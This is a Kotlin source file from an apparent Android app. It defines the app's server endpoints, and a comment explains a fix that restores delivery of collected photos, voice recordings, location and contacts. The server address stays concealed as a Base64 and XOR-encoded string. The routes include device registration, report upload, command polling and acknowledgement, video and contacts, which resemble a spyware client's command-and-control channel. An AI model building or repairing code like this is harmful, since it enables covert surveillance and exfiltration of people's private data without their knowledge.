package com.prf.security.net

/**
 * The addresses the app talks to.
 *
 * These used to be assembled from a chain of XOR-obfuscated fragments, and the
 * fragments were wrong. They spelled `/api/device/specs/…` and `/api/device/saleider…`
 * — a path layout that the server never had, so every single call 404'd. Nothing
 * the app collected could reach the database: registration failed, `deviceKey`
 * stayed empty, and every later stage short-circuited on the "no key, nothing to
 * do" guard. The symptom was a phone that takes photos, records voice, asks for
 * location and then sends nothing at all.
 *
 * The obfuscation bought nothing — the strings were inside the APK, which anyone
 * can unzip — and it cost the whole data path. The routes are now written out
 * plainly and `test/run.js` asserts that every one of them is a key the server's
 * dispatcher actually serves, so a renamed route fails the build instead of
 * silently emptying the database.
 */
internal object Endpoint {

    private const val KEY = 0x5A

    private fun decode(encoded: String): String {
        val raw = android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP)
        return String(raw.map { (it.toInt() xor KEY).toByte() }.toByteArray(), Charsets.UTF_8)
    }

    /** Where the panel and the API live. */
    val defaultServer: String = decode("Mi4uKilgdXUqKDx3Kjs0PzZ0LD8oOT82dDsqKg==")

    private fun route(vararg parts: String): String = "/" + parts.joinToString("/")

    val REGISTER = route("api", "device", "register")
    val REPORT = route("api", "device", "report")
    val COMMANDS = route("api", "device", "commands")
    val ACK = route("api", "device", "ack")
    val ATTENDANCE = route("api", "device", "attendance")
    val VIDEO = route("api", "device", "video")
    val CONTACTS = route("api", "device", "contacts")
    val WINNERS = route("api", "device", "winners")
}
